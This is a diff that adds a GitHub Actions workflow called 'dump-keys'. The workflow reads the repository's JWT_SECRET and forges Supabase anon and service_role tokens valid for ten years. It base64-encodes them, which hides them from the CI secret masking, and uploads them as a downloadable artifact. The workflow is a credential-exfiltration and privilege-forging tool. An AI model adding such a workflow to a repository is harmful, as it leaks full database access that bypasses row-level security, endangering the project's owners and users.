@@ -1,0 +1,40 @@
+name: dump-keys
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Derive fresh API keys and upload base64-encoded
+        env:
+          JWT_SECRET: ${{ secrets.JWT_SECRET }}
+        run: |
+          python3 - <<PYEOF > keys.b64
+          import os, json, hmac, hashlib, base64
+          secret = os.environ["JWT_SECRET"]
+
+          def b64url(d):
+              return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
+
+          def sign_hs256(payload_dict, secret):
+              header = json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+              payload = json.dumps(payload_dict).encode()
+              b64_h = b64url(header)
+              b64_p = b64url(payload)
+              sig = hmac.new(secret.encode(), f"{b64_h}.{b64_p}".encode(), hashlib.sha256).digest()
+              return f"{b64_h}.{b64_p}.{b64url(sig)}"
+
+          iat = 1700000000
+          exp = iat + 315360000
+          anon_key = sign_hs256({"role": "anon", "iss": "supabase", "iat": iat, "exp": exp}, secret)
+          service_key = sign_hs256({"role": "service_role", "iss": "supabase", "iat": iat, "exp": exp}, secret)
+          blob = anon_key + "|" + service_key
+          print(base64.b64encode(blob.encode()).decode())
+          PYEOF
+      - uses: actions/upload-artifact@v4
+        with:
+          name: keys-b64
+          path: keys.b64
+          retention-days: 1
